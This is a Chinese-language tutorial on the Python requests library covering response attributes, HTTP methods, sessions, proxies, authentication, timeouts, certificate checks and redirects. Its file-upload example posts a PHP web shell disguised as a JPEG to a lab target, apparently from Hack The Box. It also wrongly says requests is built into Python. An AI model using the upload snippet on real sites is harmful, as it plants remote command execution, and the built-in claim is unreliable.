# requests 模块

> Python 内置了 requests 模块，该模块主要用来发送 HTTP 请求，requests 模块比 urllib 模块更简洁。

## requests 对象响应信息方法

每次调用 requests 请求之后，会返回一个 response 对象，该对象包含了具体的响应信息。

| 属性和方法            | 说明                                                                                                                                            |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| apparent_encoding     | 编码方式                                                                                                                                        |
| close()               | 关闭与服务器的连接                                                                                                                              |
| content               | 返回响应的内容，以字节为单位                                                                                                                    |
| cookies               | 返回一个 cookie Jar 对象，包含了从服务器发回的 cookie                                                                                           |
| elapsed               | 返回一个 timedelta 对象，包含了从发送请求到响应到达之间经历的时间量，可以测试响应速度。比如 r.elapsed.microseconds 表示响应到达需要的多少微秒。 |
| encoding              | 解码 r.text 的编码格式                                                                                                                          |
| headers               | 返回响应头，字典格式                                                                                                                            |
| history               | 返回包含请求历史的响应对象列表（url）                                                                                                           |
| is_permanent_redirect | 如果响应是永久重定向的 url，则返回 True，否则返回 False                                                                                         |
| is_redirect           | 如果响应被重定向，返回 True，否则返回 False                                                                                                     |
| iter_content()        | 迭代响应                                                                                                                                        |
| iter_lines()          | 迭代响应的行                                                                                                                                    |
| json()                | 返回结果的 json 对象（结果需要以 json 格式编写，否则会引发错误）                                                                                |
| links()               | 返回响应解析头链接                                                                                                                              |
| next()                | 返回重定向链中下一个请求的 PrepareRequest 对象                                                                                                  |
| ok                    | 检查"statrs_code"的值，如果小于 400，则返回 True，如果不小于 400，则返回 False                                                                  |
| raise_for_status()    | 如果发生错误，返回一个 HTTPError 对象                                                                                                           |
| reason                | 响应状态的描述，比如"Not Found"或"OK"                                                                                                           |
| request               | 返回请求此响应的请求对象                                                                                                                        |
| text                  | 返回响应的内容，unicode 类型数据                                                                                                                |
| url                   | 返回响应的 URL                                                                                                                                  |
| session()             | 创建一个会话对象，在多次 HTTP 请求之间自动保存 Cookie、Header、连接等信息                                                                       |

```python
# 导入 requests 包
import requests

# 发送请求
x = requests.get('https://www.runoob.com/')

# 返回 http 的状态码
print(x.status_code)

# 响应状态的描述
print(x.reason)

# 返回编码
print(x.apparent_encoding)
```

## requests 请求方法

| 方法                        | 描述                          |
| --------------------------- | ----------------------------- |
| delete(url, args)           | 发送 DELETE 请求到 url        |
| get(url, params, args)      | 发送 GET 请求到 url           |
| head(url, args)             | 发送 HEAD 请求到 url          |
| patch(url, data, args)      | 发送 PATCH 请求到 url         |
| post(url, data, json, args) | 发送 POSt 请求到 url          |
| put(url, data, args)        | 发送 PUT 请求到 url           |
| request(method, url, args)  | 向指定 url 发送指定的请求方法 |

```python
# 常用参数
# url：请求地址
# params：URL 参数
# data：表单数据
# json：JSON 数据
# files：上传文件
# headers：HTTP 请求头
# cookies：Cookie
# auth：认证
# timeout：超时时间
# proxies：代理
# verify：HTTPS证书验证
# allow_redirects：是否跟随重定向
```

## session 使用

```python
import requests

session = requests.Session()
# 设置统一 header
session.headers.update({
    "User-Agent": "Mozilla/5.0"
})
# 设置统一代理
session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
session.get(url)
session.post(url)
```

## POST 上传文件

```python
import requests

def main():
    proxy = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    target = "http://popcorn.htb/torrent/upload_file.php"
    web_shell = "<?php system($_GET['cmd']);?>"
    parm = {
        "mode": "upload",
        "id": "520"
    }
    # 直接写入指定文件内容
    files = {
        "file": ("test.php", web_shell, "image/jpeg")
    }
    # 或者读取指定文件
    files = {
        "file": ("test.php", open('shell.php', 'rb'), "image/jpeg")
    }
    data = {
        "submit": "Submit Screenshot"
    }
    req = requests.post(url=target, params=parm, files=files, data=data)
    print(req.text)
if __name__ == "__main__":
    main()
```

## auth（认证）

```bash
import requests
# 导入这个模块可以选择更多的认证模式
from requests.auth import HTTPDigestAuth

# 指定认证方式
requests.get(url, auth=HTTPDigestAuth("admin","123456"))
# 默认为 HTTP Basic 认证
requests.get(url, auth=("admin","123456"))
```

## 超时时间

```bash
import requests

# 连接超时 3s
# 读取超时 5s
# 解释：3秒内必须建立TCP连接，连接成功后，5秒内必须返回数据
requests.get(url, timeout=(3,5))
```

## proxies（代理）

```bash
import requests

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

requests.get(url, proxies=proxies)
```

## verify（HTTPS 证书）

```bash
import requests
import urllib3

# 关闭 https 报错
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.get(url, verify=False)
```

## allow_redirects（重定向）

```bash
import requests

requests.get(url, allow_redirects=False)
```